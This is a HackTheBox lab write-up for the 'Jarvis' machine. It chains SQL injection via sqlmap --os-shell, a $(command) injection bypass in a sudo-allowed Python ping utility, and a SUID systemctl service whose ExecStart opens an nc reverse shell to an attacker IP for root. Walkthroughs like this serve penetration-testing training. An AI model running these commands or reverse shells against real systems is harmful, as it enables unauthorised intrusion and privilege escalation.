# Jarvis - HackTheBox
## Linux - Medium

### Nmap
Nmap shows that ports 22/SSH and 80/HTTP are open.

### HTTP 
Going to the IP on port 80, we see a website for a hotel. Looking around we see a SQLi in the URL: `http://10.10.10.143/room.php?cod=1 -- - hello`.

### LFI + RCE
Using SQLMap, we can easily get a reverse shell through an LFI:
```bash
sqlmap -u http://10.10.10.143/room.php?cod=1 --os-shell
```
Once we get this reverse shell, I upload another one that connects to me via `tcp` to avoid being banned from too many request on the website.

### First PrivEsc
We are in as `www-data`. Trying `sudo -l`, we see that we can run the script `/var/www/Admin-Utilities/simpler.py` as user `pepper`.

This script is some kind of admin util, but has a serious vulnerability in these lines:
```python
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
```
which are executed when we run the script with the `-p` flag.

We can bypass the check of bad characters for command execution by using `$(command)`, e.g.,
```bash
sudo -u pepper ./simpler.py -p
Enter an IP: "$(id > /tmp/out)"
cat /tmp/out
uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)
```
We can get a shell as user `pepper` by executing a reverse shell that way.

### Second PrivEsc
As user `pepper`, we see that we can execute the binary `/bin/systemctl` which has the SUID bit set for `root`. Looging at GTFObins, we see that we can get arbitrary code execution as root:
```bash
echo '[Service]
Type=oneshot
ExecStart=/bin/nc -e /bin/bash 10.10.15.250 1337
[Install]
WantedBy=multi-user.target' > /dev/shm/privesc.service
systemctl link /dev/shm/privesc.service
systemctl enable --now /dev/shm/privesc.service
```
Listening on our box on port 1337, we immediatly get a root shell.

Note: the script in GTFO puts the service in `/tmp`. This won't work... It needs to be in another folder, `/dev/shm` works.
